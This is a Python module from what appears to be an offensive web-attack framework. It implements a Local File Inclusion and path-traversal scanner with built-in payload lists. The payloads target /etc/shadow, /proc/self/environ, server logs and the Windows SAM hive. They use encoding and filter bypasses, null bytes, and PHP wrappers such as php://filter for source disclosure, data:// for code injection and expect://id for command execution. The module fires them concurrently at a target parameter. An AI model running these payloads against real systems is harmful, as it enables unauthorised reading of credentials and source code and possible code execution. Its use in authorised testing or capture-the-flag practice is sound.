"""LFI (Local File Inclusion) scanner module."""

import asyncio
import re
from typing import Optional, Callable
from urllib.parse import quote

from ..base import AttackModule
from ...core.context import AttackContext
from ...core.http_client import Response
from ...utils.logger import log_info, log_warning, log_vulnerable, create_progress
from ...utils.flag_extractor import FlagExtractor


# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "../../../../../../",
    "../../../../../../../",
]

# Linux sensitive files
LINUX_FILES = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/proc/version",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
]

# Windows sensitive files
WINDOWS_FILES = [
    "C:\\boot.ini",
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\inetpub\\wwwroot\\web.config",
    "C:\\Windows\\System32\\config\\SAM",
]

# Encoding bypass techniques
ENCODING_BYPASSES = [
    ("../", "..%2f"),
    ("../", "..%252f"),  # Double URL encode
    ("../", "%2e%2e/"),
    ("../", "%2e%2e%2f"),
    ("../", "..%c0%af"),  # UTF-8 overlong
    ("../", "....//"),  # Filter bypass
    ("../", "..;/"),  # Semicolon bypass
]

# PHP wrappers
PHP_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=",
    "php://filter/read=convert.base64-encode/resource=",
    "php://input",
    "data://text/plain,<?php phpinfo(); ?>",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "phar://",
]

# Null byte (for old PHP)
NULL_BYTE_PAYLOADS = [
    "%00",
    "%00.php",
    "%00.html",
]

# Patterns indicating LFI success
LFI_SUCCESS_PATTERNS = [
    r'root:x:0:0',  # /etc/passwd
    r'root:.*:0:0',
    r'daemon:x:',
    r'nobody:x:',
    r'\[fonts\]',  # win.ini
    r'\[boot loader\]',  # boot.ini
    r'127\.0\.0\.1\s+localhost',  # /etc/hosts
    r'Linux version',  # /proc/version
    r'HOME=/',  # /proc/self/environ
    r'PATH=/',
    r'DOCUMENT_ROOT=',
    r'phpinfo\(\)',  # PHP info
    r'PHP Version',
    r'<\?php',  # PHP source
]


class LfiScanner(AttackModule):
    """LFI vulnerability scanner."""

    @property
    def name(self) -> str:
        return "LFI Scanner"

    @property
    def description(self) -> str:
        return "Scans for Local File Inclusion and Path Traversal vulnerabilities"

    def __init__(self, ctx: AttackContext, os_type: str = "linux"):
        """
        Initialize LFI scanner.

        Args:
            ctx: Attack context
            os_type: Target OS type (linux, windows, auto)
        """
        super().__init__(ctx)
        self.os_type = os_type
        self.flag_extractor = FlagExtractor()
        self.vulnerable_payloads: list[dict] = []
        self.readable_files: list[str] = []

    async def scan(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        include_php_wrappers: bool = True,
        include_encoding_bypass: bool = True
    ) -> list[dict]:
        """
        Scan target for LFI vulnerabilities.

        Args:
            payloads: Custom payloads (if None, uses built-in)
            on_finding: Callback function when vulnerability found
            include_php_wrappers: Include PHP wrapper payloads
            include_encoding_bypass: Include encoding bypass techniques

        Returns:
            List of findings
        """
        if payloads is None:
            payloads = self._get_default_payloads(include_php_wrappers, include_encoding_bypass)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} LFI payloads against {self.ctx.target_url}")
            log_info(f"Target parameter: {self.ctx.inject_param}")
            log_info(f"Target OS: {self.os_type}")

        # Setup baseline
        await self.setup()

        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for LFI...", total=len(payloads))

            semaphore = asyncio.Semaphore(self.ctx.threads)

            async def test_with_semaphore(payload: str):
                async with semaphore:
                    return await self._test_single_payload(payload)

            tasks = [test_with_semaphore(p) for p in payloads]

            for coro in asyncio.as_completed(tasks):
                result = await coro
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

                    if self.ctx.verbose:
                        log_vulnerable(
                            self.ctx.target_url,
                            self.ctx.inject_param or "unknown",
                            result["payload"]
                        )

        await self.cleanup()

        self.results = findings
        return findings

    def scan_sync(
        self,
        payloads: Optional[list[str]] = None,
        on_finding: Optional[Callable[[dict], None]] = None,
        include_php_wrappers: bool = True,
        include_encoding_bypass: bool = True
    ) -> list[dict]:
        """Synchronous scan."""
        if payloads is None:
            payloads = self._get_default_payloads(include_php_wrappers, include_encoding_bypass)

        if self.ctx.verbose:
            log_info(f"Testing {len(payloads)} LFI payloads")

        self.setup_sync()
        findings = []

        with create_progress() as progress:
            task = progress.add_task("[cyan]Scanning for LFI...", total=len(payloads))

            for payload in payloads:
                result = self._test_single_payload_sync(payload)
                progress.update(task, advance=1)

                if result:
                    findings.append(result)
                    if on_finding:
                        on_finding(result)

        self.cleanup_sync()
        self.results = findings
        return findings

    async def _test_single_payload(self, payload: str) -> Optional[dict]:
        """Test a single LFI payload asynchronously."""
        try:
            response = await self.client.request_with_payload(payload)

            # Check for flags
            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            # Check for LFI indicators
            is_vulnerable, evidence, lfi_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"LFI ({lfi_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(lfi_type, evidence),
                    "lfi_type": lfi_type,
                    "os_detected": self._detect_os(response.text),
                    "flags_found": flags,
                    "response_length": response.content_length,
                }

                self.vulnerable_payloads.append(finding)
                self._extract_file_path(payload)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing LFI payload: {e}")

        return None

    def _test_single_payload_sync(self, payload: str) -> Optional[dict]:
        """Test a single payload synchronously."""
        try:
            response = self.client.request_with_payload_sync(payload)

            flags = self.flag_extractor.extract(response.text)
            for flag in flags:
                self.ctx.add_flag(flag)

            is_vulnerable, evidence, lfi_type = self._check_vulnerability(response, payload)

            if is_vulnerable:
                finding = {
                    "type": f"LFI ({lfi_type})",
                    "url": self.ctx.target_url,
                    "parameter": self.ctx.inject_param,
                    "payload": payload,
                    "evidence": evidence,
                    "confidence": self._calculate_confidence(lfi_type, evidence),
                    "lfi_type": lfi_type,
                    "os_detected": self._detect_os(response.text),
                    "flags_found": flags,
                }

                self.vulnerable_payloads.append(finding)
                self._extract_file_path(payload)
                return finding

        except Exception as e:
            if self.ctx.verbose:
                log_warning(f"Error testing LFI payload: {e}")

        return None

    def _check_vulnerability(
        self, response: Response, payload: str
    ) -> tuple[bool, str, str]:
        """Check if LFI was successful."""
        text = response.text

        # Check for file content patterns
        for pattern in LFI_SUCCESS_PATTERNS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                # Determine LFI type
                if "php://" in payload:
                    return True, match.group()[:100], "php_wrapper"
                elif "data://" in payload:
                    return True, match.group()[:100], "data_wrapper"
                elif "../" in payload or "..\\" in payload:
                    return True, match.group()[:100], "path_traversal"
                else:
                    return True, match.group()[:100], "direct_inclusion"

        # Check for base64 encoded content (php://filter)
        if "php://filter" in payload and "base64" in payload:
            # Look for base64 content in response
            base64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', text)
            if base64_match:
                return True, f"Base64 encoded content: {base64_match.group()[:50]}...", "php_filter"

        # Check for error-based detection
        error_patterns = [
            r'failed to open stream',
            r'include\(\)',
            r'require\(\)',
            r'file_get_contents\(\)',
            r'fopen\(\)',
            r'No such file or directory',
        ]
        for pattern in error_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                # This indicates LFI exists but file not found - still useful info
                return False, "", ""

        return False, "", ""

    def _detect_os(self, text: str) -> str:
        """Detect OS from file content."""
        if re.search(r'root:x:0:0', text):
            return "linux"
        if re.search(r'\[fonts\]|\[boot loader\]', text, re.IGNORECASE):
            return "windows"
        return "unknown"

    def _extract_file_path(self, payload: str) -> None:
        """Extract the file path from payload."""
        # Remove traversal sequences
        clean_path = re.sub(r'\.\.[\\/]+', '', payload)
        clean_path = re.sub(r'php://filter.*resource=', '', clean_path)
        clean_path = re.sub(r'%00.*', '', clean_path)

        if clean_path and clean_path not in self.readable_files:
            self.readable_files.append(clean_path)

    def _calculate_confidence(self, lfi_type: str, evidence: str) -> str:
        """Calculate confidence level."""
        if lfi_type in ["path_traversal", "direct_inclusion", "php_wrapper"]:
            if any(p in evidence for p in ["root:", "[fonts]", "PHP Version"]):
                return "high"
        return "medium"

    def _get_default_payloads(
        self, include_php_wrappers: bool, include_encoding_bypass: bool
    ) -> list[str]:
        """Get default LFI payloads."""
        payloads = []

        # Determine target files based on OS
        if self.os_type in ["linux", "auto"]:
            target_files = LINUX_FILES
        elif self.os_type == "windows":
            target_files = WINDOWS_FILES
        else:
            target_files = LINUX_FILES + WINDOWS_FILES

        # Generate path traversal payloads
        for traversal in PATH_TRAVERSAL_PAYLOADS:
            for file_path in target_files:
                # Remove leading / for traversal
                clean_file = file_path.lstrip("/").lstrip("C:\\")
                payloads.append(traversal + clean_file)

        # Add direct paths
        payloads.extend(target_files)

        # Add encoding bypasses
        if include_encoding_bypass:
            encoded_payloads = []
            for original, encoded in ENCODING_BYPASSES:
                for payload in payloads[:20]:  # Limit to avoid explosion
                    encoded_payloads.append(payload.replace("../", encoded))
            payloads.extend(encoded_payloads)

        # Add PHP wrappers
        if include_php_wrappers:
            for wrapper in PHP_WRAPPERS:
                if "resource=" in wrapper:
                    payloads.append(wrapper + "index.php")
                    payloads.append(wrapper + "config.php")
                    payloads.append(wrapper + "/etc/passwd")
                else:
                    payloads.append(wrapper)

        # Add null byte payloads (for legacy PHP)
        null_payloads = []
        for null_byte in NULL_BYTE_PAYLOADS:
            for payload in payloads[:10]:
                null_payloads.append(payload + null_byte)
        payloads.extend(null_payloads)

        return list(set(payloads))

    def generate_traversal_payload(self, depth: int, file_path: str) -> str:
        """Generate path traversal payload with specific depth."""
        traversal = "../" * depth
        return traversal + file_path.lstrip("/")

    def get_php_filter_payload(self, file_path: str) -> str:
        """Get PHP filter payload for reading source code."""
        return f"php://filter/convert.base64-encode/resource={file_path}"
